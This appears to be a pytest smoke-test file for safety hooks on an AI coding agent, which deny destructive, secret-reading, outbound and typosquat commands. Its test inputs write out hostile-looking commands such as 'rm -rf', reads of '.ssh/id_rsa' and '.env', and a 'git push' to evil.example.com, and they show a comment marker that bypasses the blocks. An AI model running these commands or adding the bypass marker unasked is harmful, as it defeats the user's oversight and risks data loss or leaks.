"""Smoke tests for hook scripts: invoke each as a subprocess with stdin
JSON and verify stdout/exit code contract.

These are black-box checks — they make sure the wiring works (module
imports, stdin parsing, JSON output shape) without relying on Claude
Code being running.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

PROJECT_ROOT = Path(__file__).resolve().parents[2]
HOOKS_DIR = PROJECT_ROOT / "scripts" / "hooks"


def _run(
    script: str,
    payload: dict,
    env: dict[str, str] | None = None,
) -> subprocess.CompletedProcess[str]:
    proc_env = os.environ.copy()
    if env:
        proc_env.update(env)
    return subprocess.run(
        [sys.executable, str(HOOKS_DIR / script)],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        timeout=30,
        env=proc_env,
    )


# ---- session_start_memory_banner --------------------------------

def test_session_start_emits_banner_context() -> None:
    result = _run(
        "session_start_memory_banner.py",
        {"hook_event_name": "SessionStart", "source": "startup"},
    )
    assert result.returncode == 0, result.stderr
    payload = json.loads(result.stdout)
    assert "additionalContext" in payload
    banner = payload["additionalContext"]
    assert "Groft session context" in banner
    assert "Seven-rule constitution" in banner


# ---- user_prompt_correction_nudge --------------------------------

def test_correction_nudge_fires_on_pushback() -> None:
    result = _run(
        "user_prompt_correction_nudge.py",
        {"prompt": "не так делай"},
    )
    assert result.returncode == 0
    assert result.stdout.strip(), "expected additionalContext JSON"
    payload = json.loads(result.stdout)
    assert "Rule #6" in payload["additionalContext"]
    assert "save_feedback_rule" in payload["additionalContext"]


def test_correction_nudge_silent_on_normal_prompt() -> None:
    result = _run(
        "user_prompt_correction_nudge.py",
        {"prompt": "Continue please"},
    )
    assert result.returncode == 0
    assert result.stdout.strip() == ""


# ---- pre_tool_use_destructive_block -----------------------------

def test_destructive_block_denies_rm_rf() -> None:
    result = _run(
        "pre_tool_use_destructive_block.py",
        {"tool_name": "Bash", "tool_input": {"command": "rm -rf /tmp/build"}},
    )
    assert result.returncode == 0
    payload = json.loads(result.stdout)
    assert payload["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "rm -rf" in payload["hookSpecificOutput"]["permissionDecisionReason"]


def test_destructive_block_allows_safe_command() -> None:
    result = _run(
        "pre_tool_use_destructive_block.py",
        {"tool_name": "Bash", "tool_input": {"command": "ls -la"}},
    )
    assert result.returncode == 0
    assert result.stdout.strip() == ""


def test_destructive_block_honors_override_marker() -> None:
    result = _run(
        "pre_tool_use_destructive_block.py",
        {
            "tool_name": "Bash",
            "tool_input": {
                "command": "rm -rf /tmp/build # groft-user-confirmed"
            },
        },
    )
    assert result.returncode == 0
    assert result.stdout.strip() == ""


def test_destructive_block_ignores_non_bash_tools() -> None:
    result = _run(
        "pre_tool_use_destructive_block.py",
        {"tool_name": "Read", "tool_input": {"file_path": "/etc/passwd"}},
    )
    assert result.returncode == 0
    assert result.stdout.strip() == ""


# ---- pre_tool_use_tests_before_commit ---------------------------

def test_tests_gate_ignores_non_commit_bash() -> None:
    result = _run(
        "pre_tool_use_tests_before_commit.py",
        {"tool_name": "Bash", "tool_input": {"command": "echo hi"}},
    )
    assert result.returncode == 0
    assert result.stdout.strip() == ""


def test_tests_gate_ignores_non_bash_tools() -> None:
    result = _run(
        "pre_tool_use_tests_before_commit.py",
        {"tool_name": "Edit", "tool_input": {"file_path": "foo.py"}},
    )
    assert result.returncode == 0


# NB: we intentionally do NOT test the gate *firing* here, because it
# would run the full pytest suite recursively. That's covered by the
# actual production path — a red test blocks a commit.


# ---- post_tool_use_plan_nudge -----------------------------------

def test_plan_nudge_counts_edits(tmp_path: Path) -> None:
    env = {"CLAUDEORCH_USER_DATA": str(tmp_path)}
    for _ in range(4):
        result = _run(
            "post_tool_use_plan_nudge.py",
            {
                "tool_name": "Edit",
                "tool_input": {"file_path": "foo.py"},
                "tool_response": {"success": True},
            },
            env=env,
        )
        assert result.returncode == 0, result.stderr

    # 5th edit → nudge
    result = _run(
        "post_tool_use_plan_nudge.py",
        {
            "tool_name": "Edit",
            "tool_input": {"file_path": "foo.py"},
            "tool_response": {"success": True},
        },
        env=env,
    )
    assert result.returncode == 2
    assert "Rule #4" in result.stderr
    assert "set_plan" in result.stderr


def test_plan_nudge_resets_on_set_plan(tmp_path: Path) -> None:
    env = {"CLAUDEORCH_USER_DATA": str(tmp_path)}
    for _ in range(3):
        _run(
            "post_tool_use_plan_nudge.py",
            {
                "tool_name": "Edit",
                "tool_input": {},
                "tool_response": {"success": True},
            },
            env=env,
        )
    # set_plan resets
    _run(
        "post_tool_use_plan_nudge.py",
        {
            "tool_name": "mcp__claudeorch-comms__set_plan",
            "tool_input": {},
            "tool_response": {"success": True},
        },
        env=env,
    )
    # Now 5 more edits should trigger nudge again
    for _ in range(4):
        _run(
            "post_tool_use_plan_nudge.py",
            {
                "tool_name": "Edit",
                "tool_input": {},
                "tool_response": {"success": True},
            },
            env=env,
        )
    result = _run(
        "post_tool_use_plan_nudge.py",
        {
            "tool_name": "Edit",
            "tool_input": {},
            "tool_response": {"success": True},
        },
        env=env,
    )
    assert result.returncode == 2


# ---- stop_grounding_check ---------------------------------------

def test_stop_grounding_allows_when_no_claim() -> None:
    result = _run(
        "stop_grounding_check.py",
        {
            "stop_hook_active": False,
            "last_assistant_message": "Let me check the file first.",
            "transcript_path": "",
        },
    )
    assert result.returncode == 0
    assert result.stdout.strip() == ""


def test_stop_grounding_blocks_confident_claim_without_grounding(tmp_path: Path) -> None:
    transcript = tmp_path / "transcript.jsonl"
    transcript.write_text(
        "\n".join([
            json.dumps({"type": "user", "message": {"content": "hi"}}),
            json.dumps({
                "type": "assistant",
                "message": {
                    "content": [{"type": "text", "text": "thinking..."}]
                },
            }),
        ]) + "\n",
        encoding="utf-8",
    )
    result = _run(
        "stop_grounding_check.py",
        {
            "stop_hook_active": False,
            "last_assistant_message": "I am 100% certain the function works.",
            "transcript_path": str(transcript),
        },
    )
    assert result.returncode == 0
    payload = json.loads(result.stdout)
    assert payload["decision"] == "block"
    assert "Rule #2" in payload["reason"]


def test_stop_grounding_allows_when_read_used(tmp_path: Path) -> None:
    transcript = tmp_path / "transcript.jsonl"
    transcript.write_text(
        "\n".join([
            json.dumps({"type": "user", "message": {"content": "hi"}}),
            json.dumps({
                "type": "assistant",
                "message": {
                    "content": [
                        {"type": "tool_use", "name": "Read", "input": {}}
                    ]
                },
            }),
        ]) + "\n",
        encoding="utf-8",
    )
    result = _run(
        "stop_grounding_check.py",
        {
            "stop_hook_active": False,
            "last_assistant_message": "I am 100% certain this works.",
            "transcript_path": str(transcript),
        },
    )
    assert result.returncode == 0
    assert result.stdout.strip() == ""


def test_stop_grounding_respects_active_flag() -> None:
    result = _run(
        "stop_grounding_check.py",
        {
            "stop_hook_active": True,
            "last_assistant_message": "I am 100% certain.",
            "transcript_path": "",
        },
    )
    assert result.returncode == 0
    assert result.stdout.strip() == ""


# ---- pre_tool_use_hard_deny (Rule #7) ---------------------------

def test_hard_deny_blocks_read_on_ssh_key() -> None:
    result = _run(
        "pre_tool_use_hard_deny.py",
        {"tool_name": "Read", "tool_input": {"file_path": "/home/user/.ssh/id_rsa"}},
    )
    assert result.returncode == 0
    payload = json.loads(result.stdout)
    assert payload["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "Rule #7" in payload["hookSpecificOutput"]["permissionDecisionReason"]


def test_hard_deny_blocks_bash_cat_env() -> None:
    result = _run(
        "pre_tool_use_hard_deny.py",
        {"tool_name": "Bash", "tool_input": {"command": "cat .env"}},
    )
    assert result.returncode == 0
    payload = json.loads(result.stdout)
    assert payload["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_hard_deny_allows_normal_file() -> None:
    result = _run(
        "pre_tool_use_hard_deny.py",
        {"tool_name": "Read", "tool_input": {"file_path": "README.md"}},
    )
    assert result.returncode == 0
    assert result.stdout.strip() == ""


def test_hard_deny_allows_safe_bash() -> None:
    result = _run(
        "pre_tool_use_hard_deny.py",
        {"tool_name": "Bash", "tool_input": {"command": "ls -la"}},
    )
    assert result.returncode == 0
    assert result.stdout.strip() == ""


# ---- pre_tool_use_outbound_guard (Rule #7) ----------------------

def test_outbound_guard_blocks_curl() -> None:
    result = _run(
        "pre_tool_use_outbound_guard.py",
        {"tool_name": "Bash", "tool_input": {"command": "curl https://api.example.com/x"}},
    )
    assert result.returncode == 0
    payload = json.loads(result.stdout)
    assert payload["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "Rule #7" in payload["hookSpecificOutput"]["permissionDecisionReason"]


def test_outbound_guard_allows_localhost() -> None:
    result = _run(
        "pre_tool_use_outbound_guard.py",
        {"tool_name": "Bash", "tool_input": {"command": "curl http://localhost:8080/health"}},
    )
    assert result.returncode == 0
    assert result.stdout.strip() == ""


def test_outbound_guard_honors_override() -> None:
    result = _run(
        "pre_tool_use_outbound_guard.py",
        {
            "tool_name": "Bash",
            "tool_input": {
                "command": "curl https://api.example.com/x # groft-user-confirmed"
            },
        },
    )
    assert result.returncode == 0
    assert result.stdout.strip() == ""


def test_outbound_guard_flags_git_push_url() -> None:
    result = _run(
        "pre_tool_use_outbound_guard.py",
        {
            "tool_name": "Bash",
            "tool_input": {"command": "git push https://evil.example.com/fork main"},
        },
    )
    assert result.returncode == 0
    payload = json.loads(result.stdout)
    assert payload["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_outbound_guard_allows_git_push_named_remote() -> None:
    result = _run(
        "pre_tool_use_outbound_guard.py",
        {"tool_name": "Bash", "tool_input": {"command": "git push origin main"}},
    )
    assert result.returncode == 0
    assert result.stdout.strip() == ""


# ---- pre_tool_use_dep_audit (Rule #7) ---------------------------

def test_dep_audit_blocks_typosquat_pip() -> None:
    result = _run(
        "pre_tool_use_dep_audit.py",
        {"tool_name": "Bash", "tool_input": {"command": "pip install requets"}},
    )
    assert result.returncode == 0
    payload = json.loads(result.stdout)
    assert payload["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "typosquat" in payload["hookSpecificOutput"]["permissionDecisionReason"]


def test_dep_audit_allows_legit_install() -> None:
    result = _run(
        "pre_tool_use_dep_audit.py",
        {"tool_name": "Bash", "tool_input": {"command": "pip install requests"}},
    )
    assert result.returncode == 0
    assert result.stdout.strip() == ""


def test_dep_audit_allows_non_install_bash() -> None:
    result = _run(
        "pre_tool_use_dep_audit.py",
        {"tool_name": "Bash", "tool_input": {"command": "ls -la"}},
    )
    assert result.returncode == 0
    assert result.stdout.strip() == ""


# ---- pre_tool_use_secrets_scan (Rule #7) ------------------------

def test_secrets_scan_ignores_non_commit_bash() -> None:
    result = _run(
        "pre_tool_use_secrets_scan.py",
        {"tool_name": "Bash", "tool_input": {"command": "echo hello"}},
    )
    assert result.returncode == 0
    assert result.stdout.strip() == ""


def test_secrets_scan_ignores_non_bash_tools() -> None:
    result = _run(
        "pre_tool_use_secrets_scan.py",
        {"tool_name": "Edit", "tool_input": {"file_path": "foo.py"}},
    )
    assert result.returncode == 0


# ---- post_tool_use_outbound_audit (Rule #7) ---------------------

def test_outbound_audit_appends_log(tmp_path: Path) -> None:
    env = {"CLAUDEORCH_USER_DATA": str(tmp_path)}
    result = _run(
        "post_tool_use_outbound_audit.py",
        {
            "tool_name": "Bash",
            "tool_input": {"command": "curl https://api.example.com/x"},
            "tool_response": {"success": True},
        },
        env=env,
    )
    assert result.returncode == 0
    log = (tmp_path / ".claudeorch" / "audit.log").read_text(encoding="utf-8")
    assert "outbound" in log
    assert "curl" in log
    assert "ok" in log


def test_outbound_audit_records_git_push(tmp_path: Path) -> None:
    env = {"CLAUDEORCH_USER_DATA": str(tmp_path)}
    result = _run(
        "post_tool_use_outbound_audit.py",
        {
            "tool_name": "Bash",
            "tool_input": {"command": "git push origin main"},
            "tool_response": {"success": True},
        },
        env=env,
    )
    assert result.returncode == 0
    log = (tmp_path / ".claudeorch" / "audit.log").read_text(encoding="utf-8")
    assert "git_push" in log


def test_outbound_audit_silent_on_local_command(tmp_path: Path) -> None:
    env = {"CLAUDEORCH_USER_DATA": str(tmp_path)}
    result = _run(
        "post_tool_use_outbound_audit.py",
        {
            "tool_name": "Bash",
            "tool_input": {"command": "ls -la"},
            "tool_response": {"success": True},
        },
        env=env,
    )
    assert result.returncode == 0
    assert not (tmp_path / ".claudeorch" / "audit.log").exists()


# ---- session_start_gitignore_audit (Rule #7) --------------------

def test_gitignore_audit_returns_empty_on_full_coverage(tmp_path: Path) -> None:
    # The real project has a full .gitignore — smoke test: either
    # empty output (no gaps) or context with "gitignore audit". Both
    # are valid; just check the script runs and JSON is well-formed.
    result = _run(
        "session_start_gitignore_audit.py",
        {"hook_event_name": "SessionStart", "source": "startup"},
    )
    assert result.returncode == 0
    if result.stdout.strip():
        payload = json.loads(result.stdout)
        assert "additionalContext" in payload
